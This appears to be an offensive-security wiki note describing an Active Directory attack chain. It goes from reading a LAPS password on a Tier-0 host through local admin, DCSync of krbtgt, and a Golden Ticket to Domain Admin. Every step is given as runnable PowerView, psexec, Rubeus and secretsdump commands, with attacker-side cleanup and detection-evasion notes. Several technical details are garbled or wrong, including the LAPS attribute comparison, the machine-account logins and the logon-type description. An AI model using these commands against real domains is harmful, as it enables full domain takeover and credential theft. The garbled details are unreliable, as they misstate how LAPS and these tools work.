---
title: "Attack Path: LAPS Password Read → Local Admin on a Tier-0 Box → DCSync → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, laps, acl-abuse, privilege-escalation]
---

# Attack Path: LAPS Password Read → Local Admin on a Tier-0 Box → DCSync → Domain Admin

The **[[laps]]** abuse: LAPS stores the per-machine local-admin password in a
computer-object attribute (`ms-Mcs-AdmPwd`) with a **read ACE on the computer
itself**. If you have an object-control edge (read / GenericWrite /
`WriteProperty` on that attribute) on a **Tier-0 box** (a DC, or a host that
itself holds a DCSync right / is a jump box with `AdminTo` to a DC), you read
the LAPS password → become local admin on that Tier-0 host → DCSync → DA.
This turns a low-priv object-control edge into a domain-dominance chain with
no password spray and no ticket forgery.

## Chain

```
You (low-priv foothold)
  --BloodHound: object-control/read edge on a Tier-0 computer object-->
  --read ms-Mcs-AdmPwd (LAPS password) for that box-->
  --log in as local admin on the Tier-0 host-->
  --(host is a DC, or holds GetChanges, or AdminTo a DC)--> DCSync krbtgt
  --Golden Ticket--> Domain Admin
```

## Prerequisites / what signals this path exists

- **An object-control / read edge on a computer object** that runs LAPS — the
  `ms-Mcs-AdmPwd` read is granted to the computer object's `SELF` (and, via
  inheritance, to principals with object-control on it). Confirm the edge:

```powershell
# Who can read the LAPS password on this computer? (PowerView)
Get-DomainObjectAcl -Identity <computer> -Resolved | Where-Object {
    $_.ActiveDirectoryRights -match 'Read|GenericRead|GenericWrite|WriteProperty'
}
# Or BloodHound: <you> -> (Reads / AllExtendedRights) on a computer object
```

- The computer must **actually run LAPS** (have a `ms-Mcs-AdmPwd` value).
- The host must be **Tier-0** in some useful way — a DC, or it holds a DCSync
  right (`GetChanges`/`GetChangesAll`), or it's a jump box with `AdminTo` to a
  DC. A plain workstation is only a stepping stone.

See [[laps]] for the attribute + who can read it, [[acl-abuse]] for the
object-control edge, [[dcsync]] for the DCSync right.

## Step 1 — Read the LAPS password for the Tier-0 box

```powershell
# Direct attribute read (from a domain-auth context)
Get-DomainComputer -Identity <computer> -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd
# or LAPS-specific (GetLapsPassword / PowerUpACK)
Get-ADComputer -Identity <computer> -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd
```

**Verify:** you have the plaintext local-admin password for `<computer>`.
If the attribute is empty, LAPS isn't set on it (or it uses LAPS v1
`lDAPDisplayName`/`ms-Mcs-AdmPwd` vs v2 `ms-Mcs-AdmPwd`/`ms-Mcs-AdmPwd` —
check the version; see [[laps]]).

### Failure modes & fallbacks
- **Empty `ms-Mcs-AdmPwd`** — LAPS not enabled on that box, or it's LAPS v1 and
  the value is in a different attribute. Switch to a box that does run LAPS.
- **You can read, but the box isn't Tier-0** — it's a workstation. Use it as a
  pivot (it may have `AdminTo` to a DC / a DCSync right / a service account
  with rights) rather than treating it as the end.
- **ACL edge is read-only on the attribute, not the object** — you can read
  the password but not modify the box; that's fine, reading is all you need
  here.

## Step 2 — Log in as local admin on the Tier-0 host

```powershell
# With the LAPS password, RDP / WinRM / psexec to the host as its local admin
psexec.py -dc-ip <dc> corp.local/<computer>$@<computer> -password <laps-pw>
# or
Rubeus.exe ask /user:<computer>$ /password:<laps-pw> /domain:corp.local /dc:dc01
whoami /all
```

You're now **local admin** on the Tier-0 box — no domain cred needed. See
[[laps]].

**Verify:** `whoami /all` shows `<computer>\Administrator` (local) on the box.

## Step 3 — From the Tier-0 host to DCSync

Depending on what the box is:

- **It's a DC** — you can DCSync directly (or use DSRM if the local admin is
  the DSRM account — see [[ad-persistence]]).
- **It holds a DCSync right / a service account with one** — a service
  account or process on the box has `GetChanges`/`GetChangesAll`; use it.
- **It's a jump box with `AdminTo` to a DC** — from it, psexec to the DC.

```bash
# DCSync (once you have a DCSync-capable context from the box)
secretsdump.py -k -no-pass corp.local/<dcsync-ctx>@dc01.corp.local -just-dc-user krbtgt
```

**Verify:** output shows `krbtgt` `aes256-cts-hmac-sha1-96`. Save it.
See [[dcsync]].

## Step 4 — Domain dominance

```powershell
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /aes256:<krbtgt-aes256> /sids:S-1-5-21-...:512 /ptt
whoami /all   # -> corp.local\administrator + 512
```

See [[golden-silver-tickets]]. **Verify:** `whoami /all` lists
`corp.local\administrator`.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (LAPS read) | 4661 / attribute-read on the computer object (`ms-Mcs-AdmPwd`) | a principal reading a computer's LAPS attribute |
| 2 (local login) | 4624 type 10 (local) as the box's local admin from your IP | a local-admin logon on a Tier-0 box |
| 3 (DCSync) | 4662 on the domain object (GetChanges+GetChangesAll) | replication from an unexpected context |
| 4 (Golden) | 4768/4624 for Administrator from a non-DC | DA off-DC |

## Cleanup notes
- You **read** the LAPS password — no AD object changed, so there's nothing to
  revert in AD. The trail is the attribute-read (4661) and the local logon.
- If you changed anything on the Tier-0 host, clean it; the box is a Tier-0
  asset and gets monitored.
- Expect the LAPS password to be rotated if the read is caught (LAPS
  re-randomizes on a cadence or on change) — the captured password is then
  stale.

## Related
- [[laps]] — the attribute + who-can-read model (this page is the chain)
- [[acl-abuse]] — the object-control / read prerequisite
- [[dcsync]] — the replication right that ends the chain
- [[ad-persistence]] — DSRM / DC-local-admin context
- [[bloodhound]] — how you find the Tier-0 computer + the read edge
- [[ad-tiering-and-hardening]] — why a Tier-0 box is the high-value target
